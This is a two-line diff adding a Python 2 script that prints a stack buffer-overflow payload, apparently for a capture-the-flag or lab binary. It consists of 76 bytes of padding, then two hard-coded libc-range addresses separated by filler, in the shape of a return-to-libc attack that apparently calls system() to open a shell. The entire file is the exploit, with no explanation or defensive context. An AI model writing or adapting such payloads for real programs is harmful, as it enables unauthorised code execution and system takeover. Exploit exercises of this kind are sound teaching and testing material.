@@ -1,0 +1,2 @@
+y =  "A"*76 + "\x10\x43\xe4\xf7" + "v"*4 + "\xec\x6c\xf6\xf7"
+print y
